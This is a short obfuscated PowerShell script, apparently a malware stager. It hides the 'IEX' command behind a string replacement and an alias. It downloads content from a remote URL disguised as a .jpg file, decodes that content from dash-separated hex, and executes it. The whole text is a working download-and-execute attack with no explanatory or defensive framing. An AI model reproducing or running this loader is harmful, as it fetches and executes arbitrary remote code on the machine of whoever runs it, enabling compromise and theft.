$Tbone='*EX'.replace('*','I');
sal M $Tbone;
$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
[System.Net.ServicePointManager]::SecurityProtocol = $p22;
$mv='(New-Object Net.WebClient).DownloadString(''http://paninoteka.si/Q19.jpg'')'|I`E`X;
$asciiChars= $mv -split '-' |ForEach-Object {[char][byte]"0x$_"};
$asciiString= $asciiChars -join ''|M